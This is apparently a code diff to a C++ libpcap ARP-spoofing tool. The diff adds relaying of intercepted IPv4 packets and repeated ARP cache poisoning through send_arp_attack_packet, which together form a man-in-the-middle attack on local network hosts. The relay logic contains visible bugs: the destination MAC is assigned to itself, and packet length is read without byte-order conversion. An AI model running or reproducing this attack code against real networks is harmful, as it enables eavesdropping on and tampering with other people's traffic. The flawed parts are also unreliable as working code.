@@ -14,6 +14,7 @@
 
 #include "ethhdr.h"
 #include "arphdr.h"
+#include "iphdr.h"
 
 using namespace std;
 
@@ -24,9 +25,21 @@ struct EthArpPacket final {
 	EthHdr eth_;
 	ArpHdr arp_;
 };
+
+struct EthIpPacket final {
+	EthHdr eth_;
+	IpHdr ip_;
+};
 #pragma pack(pop)
 
 map<Ip, Mac> senderIpMacMap = map<Ip, Mac>();
+
+Ip key_value_exists(const std::multimap<Ip, Ip>& mmap, Ip key, Ip value) {
+    auto range = mmap.equal_range(key);
+
+    for (auto it = range.first; it != range.second; ++it) if (it->second == value) return value;
+    return Ip("127.1.1.1");
+}
 
 Mac getMyMac(const char* interfaceName) {
     struct ifaddrs *ifaddr = NULL;
@@ -60,6 +73,38 @@ Mac getMyMac(const char* interfaceName) {
         freeifaddrs(ifaddr);
         return Mac(macAddr);
     }
+}
+
+Ip getMyIp(const char* interfaceName) {
+    struct ifaddrs *ifaddr, *ifa;
+    void *tmpAddrPtr = nullptr;
+    char ipAddr[INET_ADDRSTRLEN] = {0};
+
+    if (getifaddrs(&ifaddr) == -1) {
+        perror("getifaddrs");
+        return Ip("127.0.0.1");
+    }
+
+    for (ifa = ifaddr; ifa != nullptr; ifa = ifa->ifa_next) {
+        if (ifa->ifa_addr == nullptr) continue;
+
+        if (ifa->ifa_addr->sa_family == AF_INET) {
+            if (strcmp(ifa->ifa_name, interfaceName) == 0) {
+                tmpAddrPtr = &((struct sockaddr_in *)ifa->ifa_addr)->sin_addr;
+                inet_ntop(AF_INET, tmpAddrPtr, ipAddr, INET_ADDRSTRLEN);
+                break;
+            }
+        }
+    }
+
+    freeifaddrs(ifaddr);
+    
+    if (ipAddr[0] == '\0') {
+		fprintf(stderr, "Could not find IP address for interface: %s\n", interfaceName);
+        return Ip("127.0.0.1");
+    }
+
+    return Ip(ipAddr);
 }
 
 Mac resolveMacAddrFromSendArp(pcap_t* handle, const Ip senderIP, const Mac senderMac, const Ip targetIP, int timeout = 3000) {
@@ -181,6 +226,9 @@ int main(int argc, char* argv[]) {
 	}
 
 	Mac myMac = getMyMac(interface);
+	Ip myIp = getMyIp(interface);
+
+	printf("My IP: %s\n", string(myIp).c_str());
 
 	multimap<Ip, Ip> senderTargetMap;
 	for (int i = 2; i < argc; i += 2) senderTargetMap.insert({Ip(argv[i]), Ip(argv[i + 1])});
@@ -204,40 +252,79 @@ int main(int argc, char* argv[]) {
             exit(EXIT_FAILURE);
         }
 
-        EthArpPacket* receivedPacket = (EthArpPacket*)replyPacket;
-		switch (ntohs(receivedPacket->eth_.type_)) {
+        EthHdr* receivedPacket = (EthHdr*)replyPacket;
+		switch (ntohs(receivedPacket->type_)) {
 			case EthHdr::Arp:
-				Ip sender = ntohl(receivedPacket->arp_.sip_);
-				Ip target = ntohl(receivedPacket->arp_.tip_);
-				 
-				if (senderTargetMap.find(sender) != senderTargetMap.end()) {
-					auto range = senderTargetMap.equal_range(sender);
-					auto lower = range.first;
-					auto upper = range.second;
+				{
+					EthArpPacket* receivedPacket = (EthArpPacket*)replyPacket;
+					Ip sender = ntohl(receivedPacket->arp_.sip_);
+					Ip target = ntohl(receivedPacket->arp_.tip_);
+					
+					if (senderTargetMap.find(sender) != senderTargetMap.end()) {
+						auto range = senderTargetMap.equal_range(sender);
+						auto lower = range.first;
+						auto upper = range.second;
 
-					for (auto it = lower; it != upper; ++it) {
-						if (it->second == target) {
-							printf("Updata Arp Table %s -> %s", string(it->first).c_str(), string(it->second).c_str());
-							send_arp_attack_packet(handle, sender, target, myMac);
-							
-							break;
+						for (auto it = lower; it != upper; ++it) {
+							if (it->second == target) {
+								printf("Update Arp Table %s -> %s\n", string(it->first).c_str(), string(it->second).c_str());
+								send_arp_attack_packet(handle, sender, target, myMac);
+								
+								break;
+							}
+						}
+					}
+
+					if (senderTargetMap.find(target) != senderTargetMap.end()) {
+						auto range = senderTargetMap.equal_range(target);
+						auto lower = range.first;
+						auto upper = range.second;
+
+						for (auto it = lower; it != upper; ++it) {
+							if (it->second == target) {
+								printf("Update Arp Table %s -> %s\n", string(it->first).c_str(), string(it->second).c_str());
+								send_arp_attack_packet(handle, sender, target, myMac);
+								break;
+							}
 						}
 					}
 				}
+				break;
+			case EthHdr::Ip4:
+				{
+					EthIpPacket* receivedPacketIp = (EthIpPacket*)replyPacket;
+					if (receivedPacketIp->eth_.dmac_ != myMac) break;
+					
+					Ip sender = receivedPacketIp->ip_.src_ip(), target = receivedPacketIp->ip_.dst_ip();
 
-				if (senderTargetMap.find(target) != senderTargetMap.end()) {
-					auto range = senderTargetMap.equal_range(target);
-					auto lower = range.first;
-					auto upper = range.second;
+					if (!key_value_exists(senderTargetMap, sender, target)) break;
+					
+					printf("CatchPacket: %s -> %s\n", string(sender).c_str(), string(target).c_str());
+					
+					Mac dmac = resolveMacAddrFromSendArp(handle, myIp, myMac, target);
 
-					for (auto it = lower; it != upper; ++it) {
-						if (it->second == sender) {
-							printf("Updata Arp Table %s -> %s", string(it->first).c_str(), string(it->second).c_str());
-							send_arp_attack_packet(handle, sender, target, myMac);
-							break;
-						}
-					}
+					receivedPacketIp->eth_.smac_ = myMac; 
+					receivedPacketIp->eth_.dmac_ = receivedPacketIp->eth_.dmac_;
+					receivedPacketIp->ip_.src_ip_ = myIp;
+
+					int packetLen = receivedPacketIp->ip_.total_length_;
+
+					int res = pcap_sendpacket(handle, (const u_char*)receivedPacketIp, sizeof(EthHdr)+packetLen);
+					if (res) {
+						fprintf(stderr, "pcap_sendpacket error: %s\n", pcap_geterr(handle));
+					} else {
+						printf(
+							"Sent modified packet %s -> %s(%s -> %s)\n", 
+							string(receivedPacketIp->ip_.src_ip_).c_str(), 
+							string(receivedPacketIp->ip_.dst_ip_).c_str(), 
+							string(receivedPacketIp->eth_.smac_).c_str(), 
+							string(receivedPacketIp->eth_.dmac_).c_str()
+						);
+					}						
+				
 				}
+				
+
 				break;
 		}
 		
@@ -251,6 +338,7 @@ int main(int argc, char* argv[]) {
 		}
 
 	}
+
 	
 	pcap_close(handle);
 }
